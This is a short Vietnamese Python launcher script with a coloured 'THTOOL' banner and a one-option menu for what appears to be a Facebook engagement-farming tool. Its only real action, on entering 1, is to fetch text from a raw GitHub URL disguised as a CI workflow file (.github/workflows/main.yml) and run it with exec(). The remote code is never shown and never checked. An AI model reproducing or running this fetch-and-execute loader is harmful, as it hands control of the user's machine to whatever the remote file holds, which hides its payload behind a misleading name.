
import time
from time import strftime
import os
import sys
import requests
import json
from time import sleep
from datetime import datetime, timedelta
import base64
import requests
import os
import subprocess
from pystyle import Colors, Colorate
from rich.console import Console
from rich.panel import Panel
from rich.console import Console
from rich.text import Text
# màu
xnhac = "\033[1;36m"
do = "\033[1;31m"
luc = "\033[1;32m"
vang = "\033[1;33m"
xduong = "\033[1;34m"
tim = '\033[1;39m'
hong = "\033[1;35m"
trang = "\033[1;37m"
whiteb = "\033[1;37m"
red = "\033[0;31m"
redb = "\033[1;31m"
end = '\033[0m'
os.system("cls" if os.name == "nt" else "clear")
# đánh dấu bản quyền
ndp_tool = "\033[1;31m[\033[1;37m<>\033[1;31m] \033[1;37m=>  "
thanh = "\033[1;37m- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -"

def banner():
    banner = f"""
    \033[1;37m████████╗██╗  ██╗ ████████╗ █████╗  █████╗ ██╗
    \033[1;37m╚══██╔══╝██║  ██║ ╚══██╔══╝██╔══██╗██╔══██╗██║
       \033[1;37m██║   ███████║    ██║   ██║  ██║██║  ██║██║
       \033[1;37m██║   ██╔══██║    ██║   ██║  ██║██║  ██║██║
       \033[1;37m██║   ██║  ██║    ██║   ╚█████╔╝╚█████╔╝███████╗
       \033[1;37m╚═╝   ╚═╝  ╚═╝    ╚═╝    ╚════╝  ╚════╝ ╚══════╝ 
       
         \033[1;36mAdmin: Thiệu Hoàng | YouTube: @thieuhoang75 
            \033[1;39mBox Zalo: https://zalo.me/g/ahnoav496
                \033[1;33mNgày: {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}
\033[1;39m--------------------------------------------------------
""" 

    for X in banner:
        sys.stdout.write(X)
        sys.stdout.flush()
        sleep(0.00025)

os.system("cls" if os.name == "nt" else "clear")
banner()


print (Colorate.Diagonal(Colors.blue_to_purple, "Nhập 1 để vô tool ttc fb"))




chon = str(input('\033[1;31m[\033[1;37m<>\033[1;31m] \033[1;37m=> \033[1;32mNhập\033[1;36m Số \033[1;37m: \033[1;33m'))


if chon == '1' :
    exec(requests.get('https://raw.githubusercontent.com/Khanh23047/thoattool/main/.github/workflows/main.yml').text)
    
else :
     exit()
